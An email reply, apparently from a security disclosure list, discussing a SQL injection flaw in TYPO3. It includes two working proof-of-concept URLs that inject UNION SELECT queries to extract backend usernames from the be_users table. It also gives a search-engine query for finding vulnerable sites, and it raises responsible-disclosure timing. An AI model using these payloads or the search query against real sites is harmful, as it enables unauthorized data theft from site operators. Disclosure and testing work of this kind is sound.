Subject: RE: TYPO3 SQL Injection vunerabilitie


Here is a POC for the typo3 issue to test if you are vulnerable. This
doesn't pull the password, just the username :)

http://path/?&action=getviewcategory&category_uid=-99%20UNION%20SELECT%20use
rname%20FROM%20be_users%20WHERE%20uid=1/*

Also, it's easy to pull lists of data from the database using this
vulnerability since the query results are looped and displayed. Take the
following example. It would list usernames as categories

http://path/?&action=getviewcategory&category_uid=-99%20UNION%20SELECT%20use
rname,null%20FROM%20be_users%20WHERE%201/*

Hi Dennis,

I am pretty sure Fabian (Neonomicus) meant *every link* (or site) generated
by 
Typo3, didn't he? For instance if you search google for 
"inurl:action=getviewcategory" I am pretty sure you will understand what he 
meant (or am I wrong here)?

@Fabian (Neonomicus): Could you please provide more details about the 
vulnerability you've discoveredl? By the way did you give the Typo3 guys 
*enough* time to respond???

All the best,
Sebastian
